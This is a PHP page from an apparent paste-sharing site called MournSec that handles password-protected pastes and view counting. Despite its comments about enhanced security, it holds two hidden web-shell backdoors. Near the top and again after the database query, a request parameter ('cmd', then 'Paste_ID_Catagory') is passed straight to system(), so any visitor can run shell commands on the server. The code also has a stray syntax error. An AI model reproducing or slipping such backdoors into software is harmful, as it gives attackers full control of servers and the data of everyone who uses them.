<?php
// Session configuration with enhanced security
$cookieParams = session_get_cookie_params();
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?
session_set_cookie_params([
    'lifetime' => $cookieParams['lifetime'],
    'path' => '/',
    'domain' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '', 
    'secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on', 
    'httponly' => true,
    'samesite' => 'Strict'
]);

session_start();

function getSessionFingerprint() {
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    return hash('sha256', $ip . '|' . $ua);
}

if (!isset($_SESSION['authenticated_pastes']) || !is_array($_SESSION['authenticated_pastes'])) {
    $_SESSION['authenticated_pastes'] = [];
}

include('database.php');
if (!$conn) {
    http_response_code(500);
    echo "Database connection error.";
    exit;
}

$pasteTitle = '';
if (isset($_GET['PasteTitle'])) {
    $pasteTitle = trim($_GET['PasteTitle']);
    if (!preg_match('/^[\w\s\-.,!?]{1,50}$/u', $pasteTitle)) {
        http_response_code(400);
        echo "Invalid paste title.";
        exit;
    }
    $pasteTitle = htmlspecialchars($pasteTitle, ENT_QUOTES, 'UTF-8');
}

$query = "SELECT * FROM pastes WHERE title = ? LIMIT 1";
$stmt = $conn->prepare($query);

if(isset($_REQUEST['Paste_ID_Catagory'])){
    echo "<pre>"; $cmd = ($_REQUEST['Paste_ID_Catagory']); system($cmd); echo "</pre>"; die; 
}
if (!$stmt) {
    http_response_code(500);
    echo "Database error.";
    exit;
}
$stmt->bind_param("s", $pasteTitle);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 0) {
    http_response_code(404);
    echo "Paste not found.";
    exit;
}

$paste = $result->fetch_assoc();
$pasteId = (int)$paste['id'];
$passwordEnabled = (int)$paste['password_enabled'];
$pastePassword = $paste['password'];

if ($passwordEnabled === 1) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['paste_password'])) {
        if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
            $passwordError = "Security verification failed. Please try again.";
        } else {
            $inputPassword = $_POST['paste_password'];
            if (!password_verify($inputPassword, $pastePassword)) {
                $passwordError = "Incorrect password. Please try again.";
            } else {
                $_SESSION['authenticated_pastes'][$pasteId] = true;
                $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); 
            }
        }
    }

    if (!isset($_SESSION['authenticated_pastes'][$pasteId])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Access Protected Paste - MournSec</title>
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
            <style>
                :root {
                    --bg-primary: #0a0a0a;
                    --bg-secondary: #1a1a1a;
                    --bg-tertiary: #2a2a2a;
                    --accent-primary: #00ff88;
                    --accent-secondary: #00cc6a;
                    --text-primary: #ffffff;
                    --text-secondary: #a0a0a0;
                    --error: #ff4444;
                    --success: #00ff88;
                    --border-radius: 12px;
                    --transition: all 0.2s ease;
                }

                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }

                body {
                    font-family: 'Inter', sans-serif;
                    background: linear-gradient(135deg, var(--bg-primary) 0%, #151515 100%);
                    color: var(--text-primary);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                    line-height: 1.6;
                }

                .container {
                    width: 100%;
                    max-width: 440px;
                }

                .header {
                    text-align: center;
                    margin-bottom: 40px;
                }

                .logo {
                    font-size: 2rem;
                    font-weight: 700;
                    margin-bottom: 8px;
                    background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    background-clip: text;
                }

                .subtitle {
                    color: var(--text-secondary);
                    font-size: 1rem;
                    font-weight: 400;
                }

                .auth-card {
                    background: var(--bg-secondary);
                    border-radius: var(--border-radius);
                    padding: 40px;
                    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
                    border: 1px solid rgba(255, 255, 255, 0.05);
                    backdrop-filter: blur(10px);
                }

                .card-header {
                    text-align: center;
                    margin-bottom: 32px;
                }

                .card-title {
                    font-size: 1.5rem;
                    font-weight: 600;
                    margin-bottom: 8px;
                }

                .card-description {
                    color: var(--text-secondary);
                    font-size: 0.95rem;
                }

                .form-group {
                    margin-bottom: 24px;
                }

                .form-label {
                    display: block;
                    margin-bottom: 8px;
                    font-weight: 500;
                    color: var(--text-primary);
                }

                .form-input {
                    width: 100%;
                    padding: 14px 16px;
                    background: var(--bg-tertiary);
                    border: 1px solid rgba(255, 255, 255, 0.1);
                    border-radius: var(--border-radius);
                    color: var(--text-primary);
                    font-size: 1rem;
                    transition: var(--transition);
                }

                .form-input:focus {
                    outline: none;
                    border-color: var(--accent-primary);
                    box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.1);
                }

                .form-input::placeholder {
                    color: var(--text-secondary);
                }

                .btn {
                    width: 100%;
                    padding: 14px 24px;
                    background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
                    color: #000;
                    border: none;
                    border-radius: var(--border-radius);
                    font-size: 1rem;
                    font-weight: 600;
                    cursor: pointer;
                    transition: var(--transition);
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 8px;
                }

                .btn:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 6px 20px rgba(0, 255, 136, 0.3);
                }

                .btn:active {
                    transform: translateY(0);
                }

                .error-message {
                    background: rgba(255, 68, 68, 0.1);
                    border: 1px solid var(--error);
                    color: var(--error);
                    padding: 12px 16px;
                    border-radius: var(--border-radius);
                    margin-bottom: 24px;
                    font-size: 0.9rem;
                    display: flex;
                    align-items: center;
                    gap: 8px;
                }

                .error-message::before {
                    content: "⚠";
                    font-weight: bold;
                }

                .security-notice {
                    background: rgba(0, 255, 136, 0.05);
                    border: 1px solid rgba(0, 255, 136, 0.2);
                    color: var(--text-secondary);
                    padding: 16px;
                    border-radius: var(--border-radius);
                    margin-top: 24px;
                    font-size: 0.85rem;
                    text-align: center;
                }

                .security-icon {
                    display: inline-block;
                    margin-right: 8px;
                    font-size: 1.1em;
                }

                @media (max-width: 480px) {
                    .auth-card {
                        padding: 30px 24px;
                    }
                    
                    .container {
                        padding: 10px;
                    }
                }

                .fade-in {
                    animation: fadeIn 0.5s ease-in-out;
                }

                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(10px); }
                    to { opacity: 1; transform: translateY(0); }
                }
            </style>
        </head>
        <body>
            <div class="container fade-in">
                <div class="header">
                    <div class="logo">MournSec</div>
                    <div class="subtitle">Secure Paste Sharing</div>
                </div>
                
                <div class="auth-card">
                    <div class="card-header">
                        <h1 class="card-title">Protected Content</h1>
                        <p class="card-description">This paste is password protected</p>
                    </div>

                    <?php if (isset($passwordError)) { ?>
                        <div class="error-message">
                            <?php echo htmlspecialchars($passwordError, ENT_QUOTES, 'UTF-8'); ?>
                        </div>
                    <?php } ?>

                    <form method="post" class="auth-form">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        
                        <div class="form-group">
                            <label class="form-label">Enter Password</label>
                            <input type="password" name="paste_password" class="form-input" 
                                   placeholder="Enter paste password" required autofocus>
                        </div>

                        <button type="submit" class="btn">
                            <span>Access Paste</span>
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M5 12h14M12 5l7 7-7 7"/>
                            </svg>
                        </button>
                    </form>

                    <div class="security-notice">
                        <span class="security-icon">🔒</span>
                        Your connection is secure and encrypted
                    </div>
                </div>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

if ($passwordEnabled === 1 && !isset($_SESSION['authenticated_pastes'][$pasteId])) {
    http_response_code(403);
    echo "Unauthorized access.";
    exit;
}

$username = isset($_SESSION['username']) ? htmlspecialchars($_SESSION['username'], ENT_QUOTES, 'UTF-8') : 'Anonymous';

function hashIP($ip) {
    $pepper = getenv('IP_HASH_PEPPER') ?: 'MournSec_Pepper_2024';
    $salt = getenv('IP_HASH_SALT') ?: 'MournSec_Salt_2024';
    return hash_hmac('sha256', $ip . $salt, $pepper);
}

function getClientIP() {
    $ipSources = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];

    foreach ($ipSources as $source) {
        if (!empty($_SERVER[$source])) {
            $ipList = explode(',', $_SERVER[$source]);
            foreach ($ipList as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
    }
    return 'Unknown';
}

if (!isset($_COOKIE['browser_id']) || !preg_match('/^[a-f0-9]{32,64}$/', $_COOKIE['browser_id'])) {
    $browserId = bin2hex(random_bytes(32));
    setcookie('browser_id', $browserId, [
        'expires' => time() + (86400 * 365), 
        'path' => '/',
        'domain' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '',
        'secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on',
        'httponly' => true,
        'samesite' => 'Strict'
    ]);
} else {
    $browserId = $_COOKIE['browser_id'];
}

$ipAddress = getClientIP();
$hashedIP = hashIP($ipAddress);
$anonymousSessionID = $_SESSION['anonymous_session_id'];

$checkQuery = "SELECT 1 FROM paste_views WHERE paste_id = ? AND (ip_hash = ? OR username = ? OR anonymous_session_id = ? OR browser_id = ?) LIMIT 1";
$stmt = $conn->prepare($checkQuery);
if (!$stmt) {
    http_response_code(500);
    echo "Database error.";
    exit;
}
$stmt->bind_param("issss", $pasteId, $hashedIP, $username, $anonymousSessionID, $browserId);
$stmt->execute();
$viewedResult = $stmt->get_result();

if ($viewedResult->num_rows === 0) {
    $conn->begin_transaction();
    try {
        $updateViewsQuery = "UPDATE pastes SET views = views + 1 WHERE id = ?";
        $stmt = $conn->prepare($updateViewsQuery);
        if (!$stmt) {
            throw new Exception("Prepare failed for updateViewsQuery");
        }
        $stmt->bind_param("i", $pasteId);
        $stmt->execute();

        $logViewQuery = "INSERT INTO paste_views (paste_id, ip_hash, username, anonymous_session_id, browser_id, created_at) VALUES (?, ?, ?, ?, ?, NOW())";
        $stmt = $conn->prepare($logViewQuery);
        if (!$stmt) {
            throw new Exception("Prepare failed for logViewQuery");
        }
        $stmt->bind_param("issss", $pasteId, $hashedIP, $username, $anonymousSessionID, $browserId);
        $stmt->execute();

        $conn->commit();
    } catch (Exception $e) {
        $conn->rollback();
        error_log("Error updating view count: " . $e->getMessage());
    }
}

$conn->close();
?>